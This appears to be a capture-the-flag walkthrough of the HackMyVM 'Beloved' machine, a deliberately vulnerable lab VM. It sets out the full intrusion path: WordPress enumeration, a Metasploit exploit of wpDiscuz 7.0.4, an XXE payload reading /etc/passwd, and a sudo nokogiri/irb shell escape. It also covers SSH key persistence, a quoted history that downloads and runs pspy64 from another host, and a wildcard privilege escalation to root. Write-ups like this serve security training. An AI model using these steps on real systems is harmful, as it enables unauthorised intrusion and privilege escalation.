@@ -1,0 +1,311 @@
+---
+title: "Beloved - HackMyVM Walkthrough"
+---
+
+Difficulty: Easy
+
+nmap service scan: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/beloved]
+└─$ nmap -p- -sV 192.168.56.254
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-23 17:09 EDT
+Nmap scan report for 192.168.56.254
+Host is up (0.00050s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+{% endhighlight %}
+
+There's a default wordpress install on the machine and wpscan enumerated the user 
+smart_ass. Lets take a deeper look into the plugins on the system with wpscan:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/beloved]
+└─$ wpscan --url http://beloved/ -e ap --plugins-detection aggressive --no-banner
+--SNIP--
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://beloved/wp-content/plugins/akismet/
+ | Latest Version: 4.2.1
+ | Last Updated: 2021-10-01T18:28:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://beloved/wp-content/plugins/akismet/, status: 403
+ |
+ | The version could not be determined.
+
+[+] feed
+ | Location: http://beloved/wp-content/plugins/feed/
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://beloved/wp-content/plugins/feed/, status: 200
+ |
+ | The version could not be determined.
+
+[+] wpdiscuz
+ | Location: http://beloved/wp-content/plugins/wpdiscuz/
+ | Last Updated: 2021-10-22T18:22:00.000Z
+ | Readme: http://beloved/wp-content/plugins/wpdiscuz/readme.txt
+ | [!] The version is out of date, the latest version is 7.3.5
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://beloved/wp-content/plugins/wpdiscuz/, status: 200
+ |
+ | Version: 7.0.4 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://beloved/wp-content/plugins/wpdiscuz/readme.txt
+--SNIP--
+{% endhighlight %}
+`wpdiscuz` pops out as an unusual plugin along with the fact that it's very outdated.
+
+Using searchsploit to find an exploit for this plugin: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/beloved]
+└─$ searchsploit WordPress wpDiscuz
+--------------------------------------------------- ---------------------------------
+ Exploit Title                                     |  Path
+--------------------------------------------------- ---------------------------------
+Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated  | php/webapps/49401.rb
+--------------------------------------------------- ---------------------------------
+{% endhighlight %}
+
+After loading the exploit into metasploit and reloading the modules, we can set up
+to run the attack by setting all of options in the `info`. For this exploit I had 
+to also set LHOST. 
+
+I don't like the meterpreter shell so we'll drop to a system command shell using 
+`shell`. After doing so we'll need a more interactive shell. Luckily this machine
+has python installed:
+{% highlight terminal %}
+python -c 'import pty; pty.spawn("/bin/bash");'
+www-data@beloved:/var/www/html/wordpress/wp-content/uploads/2021/10$ 
+{% endhighlight %}
+
+
+Local enumeration
+
+checking `sudo -l`:
+{% highlight terminal %}
+User www-data may run the following commands on beloved:
+    (beloved) NOPASSWD: /usr/local/bin/nokogiri
+{% endhighlight %}
+
+mysql user and password from `wp-config.php`: 
+{% highlight php %}
+/** MySQL database username */
+define( 'DB_USER', 'wordpress_user' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'secure_password_2021!!!' );
+{% endhighlight %}
+
+
+nokogiri infomation: 
+{% highlight terminal %}
+www-data@beloved:/$ sudo -u beloved /usr/local/bin/nokogiri -v
+sudo -u beloved /usr/local/bin/nokogiri -v
+# Nokogiri (1.11.7)
+{% endhighlight %}
+
+There's an XXE vulnerability mentioned in an advisory for this version of nokogiri: 
+https://github.com/sparklemotion/nokogiri/security/advisories/GHSA-2rr5-8q37-2w7h
+
+Let's enumerate further before attempting an exploit. 
+
+Enumerating the sticky bit binaries and files on the system:
+{% highlight terminal %}
+www-data@beloved:/$ find / -perm -1000 -type d 2>/dev/null   
+find / -perm -1000 -type d 2>/dev/null
+/sys/fs/bpf
+/dev/mqueue
+/dev/shm
+/run/lock
+/tmp
+/var/tmp
+/var/spool/cron/crontabs
+/var/lib/php/sessions
+{% endhighlight %}
+
+SUID binaries on the system:
+{% highlight terminal %}
+www-data@beloved:/$ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/bin/su
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+{% endhighlight %}
+
+Not much to go on with that. Back to nokogiri. 
+
+Let's see if we can access any files on the system by writing some XML and copying it
+over to the victim machine. The XML:
+{% highlight xml %}
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+   <username>&xxe;</username>
+</xml>
+{% endhighlight %}
+This was saved as readpasswd.txt. 
+
+Then we set up a webserver to copy the XML file over to the victim machine: 
+Attacker machine:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctf/beloved]
+└─$ python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.56.254 - - [28/Oct/2021 15:34:37] "GET /readpasswd.txt HTTP/1.1" 200 -
+{% endhighlight %}
+
+Vicitim machine: 
+{% highlight terminal %}
+www-data@beloved:/tmp$ wget http://192.168.56.224:8000/readpasswd.txt
+wget http://192.168.56.224:8000/readpasswd.txt
+--2021-10-25 09:36:09--  http://192.168.56.224:8000/readpasswd.txt
+Connecting to 192.168.56.224:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 145 [text/plain]
+Saving to: 'readpasswd.txt'
+
+readpasswd.txt      100%[===================>]     145  --.-KB/s    in 0s      
+
+2021-10-25 09:36:09 (9.62 MB/s) - 'readpasswd.txt' saved [145/145]
+{% endhighlight %}
+
+Now let's try and feed the XML to nokogiri just as a test run:
+{% highlight terminal %}
+www-data@beloved:/tmp$ sudo -u beloved /usr/local/bin/nokogiri readpasswd.txt
+sudo -u beloved /usr/local/bin/nokogiri readpasswd.txt
+Your document is stored in @doc...
+irb(main):001:0> help
+help
+
+Enter the method name you want to look up.
+You can use tab to autocomplete.
+Enter a blank line to exit.
+
+>> 
+{% endhighlight %}
+
+Interestingly enough it's dropped us into a irb shell. Taking a look at gtfobins for 
+irb shows us how to pop a shell from within irb. Maybe this will still have the 
+privileges that the beloved user has:
+
+{% highlight terminal %}
+exec '/bin/bash' 
+Nothing known about .exec '/bin/bash'
+>> 
+
+=> nil
+irb(main):002:0> exec '/bin/bash'
+exec '/bin/bash'
+beloved@beloved:/tmp$
+{% endhighlight %}
+
+By entering a newline, we dropped into a different irb session from which we can 
+escape to a bash shell! 
+
+Getting the user.txt flag:
+{% highlight terminal %}
+beloved@beloved:~$ cat user.txt
+cat user.txt
+{% endhighlight %}
+
+Checked the `/opt` directory and found `id_rsa` belonging to the root user. 
+
+Setting up persistence on the machine by adding our public key to the authorized_keys
+file in the beloved users home directory worked so now we have access via ssh. 
+
+Poking around in the bash_history file as the beloved user showed the following: 
+{% highlight terminal %}
+beloved@beloved:~$ cat .bash_history 
+clear
+id
+clear
+wget http://192.168.0.28:8000/pspy64
+cd ~
+wget http://192.168.0.28:8000/pspy64
+chmod +x *
+clear
+./pspy64 |grep "UID=0"
+clear
+cd /opt
+clear
+ls -l
+cat id_rsa 
+clear
+touch test && touch -- --reference=test
+clear
+watch ls -l
+clear
+cat id_rsa 
+cd ~
+nano id_rsa
+chmod 600 id_rsa 
+clear
+ssh -i id_rsa root@localhost
+{% endhighlight %}
+
+Can we use the key in the opt directory even without the correct permissions? turns
+out it's password protected and we can't. 
+
+Checking the kernel version to see if it's vulnerable to any exploits: 
+{% highlight terminal %}
+beloved@beloved:~$ uname -a
+Linux beloved 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+{% endhighlight %}
+
+searchsploit relevant results: 
+{% highlight terminal %}
+Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pke | linux/local/47163.c
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_S | linux/local/47164.sh
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_S | linux/local/47165.sh
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_S | linux/local/47166.sh
+Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_S | linux/local/47167.sh
+{% endhighlight %}
+
+The shell scripts require certain software to be installed on the system in order to
+function which means they can't be used in this instance. 
+The C program seems promising enough to at least attempt on the target machine as 
+the required software is on the system. After setting up, let's compile the exploit
+code:
+`beloved@beloved:/tmp$ gcc -s 47163.c -o ptrace_traceme_root`
+
+Running the exploit did nothing unfortunately. 
+
+Moving back to the `bash_history` we can see the attack method used to exploit the 
+wildcard functionality in the bash shell. 
+Using the method described here: https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/
+
+Following the steps illustrated in the history file gets us the root shell. 
+
+Getting the root
+
+Following the steps illustrated in the history file gets us the root shell. 
+{% highlight terminal %}
+touch test && touch -- --reference=test
+clear
+watch ls -l
+clear
+cat id_rsa 
+cd ~
+nano id_rsa
+chmod 600 id_rsa 
+clear
+ssh -i id_rsa root@localhost
+{% endhighlight %}
+
+From here we get the root flag and submit it for the points. Hooray for points.
